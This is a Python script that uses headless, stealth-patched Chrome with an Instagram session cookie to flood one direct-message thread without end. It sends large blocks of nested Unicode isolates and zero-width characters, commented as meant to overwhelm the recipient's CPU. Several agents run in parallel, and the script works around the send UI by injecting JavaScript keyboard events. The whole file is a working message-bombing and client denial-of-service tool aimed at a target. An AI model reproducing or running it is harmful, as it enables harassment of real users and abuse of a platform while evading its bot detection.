# -*- coding: utf-8 -*-
# 🚀 PROJECT: PRAVEER.OWNS (ATOMIC-DISPATCH V53)
# 📅 STATUS: ZERO-TYPING-LAG | 4-AGENT TOTAL | AWS-CPU-TARGET

import os, time, re, random, datetime, threading, sys, gc, tempfile, subprocess, shutil
from concurrent.futures import ThreadPoolExecutor
from selenium import webdriver
from selenium_stealth import stealth
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options

# --- 4 AGENTS TOTAL CONFIG ---
AGENTS_PER_MACHINE = 2             
TOTAL_DURATION = 25000 
BURST_SPEED = (0.5, 1.2)    # 🛡️ Optimized for delivery success
REST_AFTER_STRIKES = 80    
REST_DURATION = 5          

GLOBAL_SENT = 0
COUNTER_LOCK = threading.Lock()
BROWSER_LAUNCH_LOCK = threading.Lock()

def get_atomic_payload():
    """Generates a visible, high-impact block that forces CPU recalculation."""
    u_id = random.randint(100, 999)
    # \u2060 = Word Joiner | \u2068 = Isolate | \u200D = ZWJ
    glue, iso, zwj, pop = "\u2060", "\u2068", "\u200D", "\u2069"
    
    header = f"👑 PRAVEER PAPA ON TOP 🌙 [STRIKE_NODE:{u_id}]"
    
    body = []
    # 380 lines of recursive complexity to overwhelm the 32GB AWS CPU
    for i in range(380):
        # Nested isolates combined with ZWJ bonding
        line = f"{iso}PRAVEER{zwj}PAPA{zwj}ON{zwj}TOP{zwj}🌙{i}{pop}{glue*12}"
        body.append(line)
        
    return f"{header}\n{glue.join(body)}".strip()[:9995]

def get_driver(agent_id):
    with BROWSER_LAUNCH_LOCK:
        chrome_options = Options()
        chrome_options.add_argument("--headless=new") 
        chrome_options.add_argument("--no-sandbox") 
        chrome_options.add_argument("--disable-dev-shm-usage")
        # 🛡️ Keep YOUR bot's CPU light by disabling rendering
        chrome_options.add_argument("--disable-gpu")
        chrome_options.add_argument("--blink-settings=imagesEnabled=false")
        
        ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36"
        chrome_options.add_argument(f"user-agent={ua}")
        
        driver = webdriver.Chrome(options=chrome_options)
        stealth(driver, languages=["en-US"], vendor="Google Inc.", platform="Win32", fix_hairline=True)
        return driver

def atomic_dispatch_send(driver, text):
    """Force-triggers the send event by bypassing the UI thread entirely."""
    try:
        driver.execute_script("""
            var box = document.querySelector('div[role="textbox"], textarea');
            if (box) {
                box.focus();
                // 1. Force a clean state to prevent 'Typing' hang
                document.execCommand('selectAll', false, null);
                document.execCommand('delete', false, null);
                // 2. Direct string injection
                document.execCommand('insertText', false, arguments[0]);
                // 3. Trigger React/internal input sync
                box.dispatchEvent(new Event('input', { bubbles: true }));
                
                // 4. Fire high-priority keyboard event
                var e = new KeyboardEvent('keydown', {
                    key: 'Enter', code: 'Enter', keyCode: 13, which: 13, 
                    bubbles: true, cancelable: true
                });
                box.dispatchEvent(e);
            }
        """, text)
        return True
    except: return False

def run_life_cycle(agent_id, cookie, target):
    while True:
        driver = get_driver(agent_id)
        try:
            driver.get("https://www.instagram.com/")
            driver.add_cookie({'name': 'sessionid', 'value': cookie.strip(), 'path': '/', 'domain': '.instagram.com'})
            driver.get(f"https://www.instagram.com/direct/t/{target}/")
            time.sleep(15) 
            
            strike_count = 0
            while True:
                payload = get_atomic_payload()
                if atomic_dispatch_send(driver, payload):
                    strike_count += 1
                    with COUNTER_LOCK:
                        global GLOBAL_SENT
                        GLOBAL_SENT += 1
                    print(f"Agent {agent_id}: Atomic-Strike ({GLOBAL_SENT})")
                    
                    if strike_count % 50 == 0:
                        driver.refresh()
                        time.sleep(10)
                
                time.sleep(random.uniform(*BURST_SPEED))
        except: pass
        finally:
            if driver: driver.quit()
            time.sleep(5)

def main():
    cookie = os.environ.get("INSTA_COOKIE", "").strip()
    target = os.environ.get("TARGET_THREAD_ID", "").strip()
    with ThreadPoolExecutor(max_workers=AGENTS_PER_MACHINE) as executor:
        for i in range(AGENTS_PER_MACHINE):
            executor.submit(run_life_cycle, i+1, cookie, target)

if __name__ == "__main__":
    main()
